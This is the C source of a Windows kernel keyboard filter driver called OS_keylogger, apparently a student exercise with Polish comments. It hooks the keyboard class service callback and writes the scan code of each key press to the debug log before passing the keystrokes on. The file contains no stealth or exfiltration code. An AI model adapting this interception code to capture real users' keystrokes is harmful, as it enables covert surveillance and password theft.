#include <ntddk.h>
#include <wdf.h>

#include<ntddkbd.h>
#include <kbdmou.h>

typedef struct _DEVICE_CONTEXT {
    CONNECT_DATA UpperConnectData; 
    BOOLEAN IsHooked;
} DEVICE_CONTEXT, * PDEVICE_CONTEXT;

WDF_DECLARE_CONTEXT_TYPE(DEVICE_CONTEXT)

PDEVICE_CONTEXT global_context;

DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_DEVICE_ADD OS_keyloggerEvtDeviceAdd;
//EVT_WDF_IO_QUEUE_IO_READ OS_keyloggerRead;
EVT_WDF_IO_QUEUE_IO_INTERNAL_DEVICE_CONTROL OS_keyloggerInternalDeviceControl;
VOID
OS_keyloggerCallback(
    _In_    PDEVICE_OBJECT       DeviceObject,
    _In_    PKEYBOARD_INPUT_DATA InputDataStart,
    _In_    PKEYBOARD_INPUT_DATA InputDataEnd,
    _Inout_ PULONG               InputDataConsumed
);

NTSTATUS
DriverEntry(
    _In_ PDRIVER_OBJECT     DriverObject,
    _In_ PUNICODE_STRING    RegistryPath
)
{
    // NTSTATUS variable to record success or failure
    NTSTATUS status = STATUS_SUCCESS;

    // Allocate the driver configuration object
    WDF_DRIVER_CONFIG config;

    //DbgBreakPoint();

    // Print "Hello World" for DriverEntry
    DbgPrint("OS_keylogger: DriverEntry\n");

    // Initialize the driver configuration object to register the
    // entry point for the EvtDeviceAdd callback
    WDF_DRIVER_CONFIG_INIT(&config,
        OS_keyloggerEvtDeviceAdd
    );

    // Finally, create the driver object
    status = WdfDriverCreate(DriverObject,
        RegistryPath,
        WDF_NO_OBJECT_ATTRIBUTES,
        &config,
        WDF_NO_HANDLE
    );
    return status;
}

NTSTATUS
OS_keyloggerEvtDeviceAdd(
    _In_    WDFDRIVER       Driver,
    _Inout_ PWDFDEVICE_INIT DeviceInit
)
{
    // We're not using the driver object,
    // so we need to mark it as unreferenced
    UNREFERENCED_PARAMETER(Driver);

    NTSTATUS status;
    WDF_OBJECT_ATTRIBUTES wdfObjectAttr;
    WDFDEVICE wdfDevice;

    // Print "Hello World"
    DbgPrint("OS_keylogger: OS_keyloggerEvtDeviceAdd\n");

    WdfFdoInitSetFilter(DeviceInit);

    WdfDeviceInitSetDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);

    WDF_OBJECT_ATTRIBUTES_INIT_CONTEXT_TYPE(&wdfObjectAttr, DEVICE_CONTEXT);
    // Create the device object
    status = WdfDeviceCreate(&DeviceInit,
        &wdfObjectAttr,
        &wdfDevice
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: WdfDeviceCreate failed with status 0x%x\n", status);
        return status;
    }

    global_context = WdfObjectGet_DEVICE_CONTEXT(wdfDevice);

    WDF_IO_QUEUE_CONFIG queueConfig;

    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig,
        WdfIoQueueDispatchParallel);

    //queueConfig.EvtIoRead = OS_keyloggerRead;
    queueConfig.EvtIoInternalDeviceControl = OS_keyloggerInternalDeviceControl;

    status = WdfIoQueueCreate(wdfDevice,
        &queueConfig,
        WDF_NO_OBJECT_ATTRIBUTES,
        WDF_NO_HANDLE
    );

    if (!NT_SUCCESS(status)) {
        DbgPrint("OS_keylogger: WdfIoQueueCreate failed with status 0x%x\n", status);
        return status;
    }

    return STATUS_SUCCESS;
}

VOID
OS_keyloggerInternalDeviceControl(
    WDFQUEUE    Queue,
    WDFREQUEST  Request,
    size_t      OutputBufferLength,
    size_t      InputBufferLength,
    ULONG       IoControlCode
)
{
    UNREFERENCED_PARAMETER(OutputBufferLength);

    DbgPrint("OS_keylogger: InternalDeviceControl\n");

    NTSTATUS status;
    PCONNECT_DATA connectData;
    size_t length;

    WDFDEVICE device;
    PDEVICE_CONTEXT context;

    WDF_REQUEST_SEND_OPTIONS options;
    WDFIOTARGET target;
    BOOLEAN ret;

    //odczytujemy device i kontekst 
    device = WdfIoQueueGetDevice(Queue);
    context = WdfObjectGet_DEVICE_CONTEXT(device);

    //jeœli nie po³¹czenie klawiatury to pomijamy
    if (IoControlCode != IOCTL_INTERNAL_KEYBOARD_CONNECT)
    {
        goto Forward;
    }

    //sprawdzamy, czy bufor ma poprawny rozmiar
    if (InputBufferLength < sizeof(CONNECT_DATA))
    {
        DbgPrint("OS_keylogger: Z³y rozmiar bufora!\n");
        WdfRequestComplete(Request, STATUS_INVALID_PARAMETER);
        return;
    }

    status = WdfRequestRetrieveInputBuffer(Request, sizeof(CONNECT_DATA), (PVOID*)&connectData, &length);
    if (!NT_SUCCESS(status))
    {
        WdfRequestComplete(Request, status);
        return;
    }

    context->UpperConnectData = *connectData;
    connectData->ClassService = (PVOID)OS_keyloggerCallback;
    connectData->ClassDeviceObject = WdfDeviceWdmGetDeviceObject(device);

    DbgPrint("OS_keylogger: Hook installed\n");

Forward:

    WdfRequestFormatRequestUsingCurrentType(Request);

    target = WdfDeviceGetIoTarget(device);

    WDF_REQUEST_SEND_OPTIONS_INIT(&options, WDF_REQUEST_SEND_OPTION_SEND_AND_FORGET);

    ret = WdfRequestSend(Request, target, &options);

    if (ret == FALSE)   
    {
        status = WdfRequestGetStatus(Request);
        DbgPrint("OS_keylogger: WdfRequestSend failed: 0x%x\n", status);
        WdfRequestComplete(Request, status);
    }
}

VOID
OS_keyloggerCallback(
    _In_    PDEVICE_OBJECT       DeviceObject,
    _In_    PKEYBOARD_INPUT_DATA InputDataStart,
    _In_    PKEYBOARD_INPUT_DATA InputDataEnd,
    _Inout_ PULONG               InputDataConsumed
)
{ 
    UNREFERENCED_PARAMETER(DeviceObject);

    PDEVICE_CONTEXT context = global_context;

    if (!context)
        return;

    PKEYBOARD_INPUT_DATA currentPacket;

    for (currentPacket = InputDataStart; currentPacket < InputDataEnd; currentPacket++) {
        BOOLEAN isKeyRelease = (currentPacket->Flags & KEY_BREAK) ? TRUE : FALSE;

        if (!isKeyRelease)
        {
            // Logujemy tylko wciœniêcia (Key Down)
            DbgPrint("OS_keylogger: Klawisz WCISNIETY! ScanCode: 0x%02X | Flags: 0x%X\n",
                currentPacket->MakeCode,
                currentPacket->Flags);
        }
    }

    //Wywo³anie nastêpnej funkcji
    PSERVICE_CALLBACK_ROUTINE upperService = (PSERVICE_CALLBACK_ROUTINE)context->UpperConnectData.ClassService;

    if (upperService)
    {
        upperService(
            context->UpperConnectData.ClassDeviceObject,
            InputDataStart,
            InputDataEnd,
            InputDataConsumed
            );
    }
}

/*
VOID
OS_keyloggerRead(
    _In_ WDFQUEUE queue,
    _In_ WDFREQUEST request,
    _In_ size_t size
) 
{
    NTSTATUS status;

    UNREFERENCED_PARAMETER(queue);

    PKEYBOARD_INPUT_DATA input = NULL;
    status = WdfRequestRetrieveInputBuffer(request, size, (PVOID*)input, NULL);

    if (!NT_SUCCESS(status)) {
        return;
    }

    if (input->Flags == 0) {
        DbgPrint("OS_keylogger: key down\n");
    }
    WdfRequestComplete(request, STATUS_SUCCESS);
}
*/